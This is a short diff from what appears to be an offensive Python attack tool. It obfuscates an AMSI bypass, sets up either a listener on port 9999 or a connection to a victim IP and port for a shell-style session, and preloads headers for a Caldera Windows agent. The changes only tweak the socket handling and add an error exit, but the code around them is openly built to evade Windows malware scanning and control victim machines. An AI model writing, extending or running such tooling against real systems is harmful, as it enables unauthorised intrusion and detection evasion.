@@ -11,11 +11,15 @@ amsi_bypass_lst = translator.preset_obfuscation(bypasslevel,amsi_bypass_init)
 
 if listen_tcp:
     c = listen(9999,'0.0.0.0')
-    c.recv()
+    c.sendline(b'')
 
 elif reverse_tcp:
     c = connect(VICTIM_IP,VICTIM_PORT)
-    c.recv()
+    c.recv(timeout=2)
+
+else:
+    decor("[!] No selection chosen in attacker_conf.py")
+    exit(1)
 
 ## preloaded information
 win_caldera_headers = '{"platform"="windows";"file"="manx.go"}'
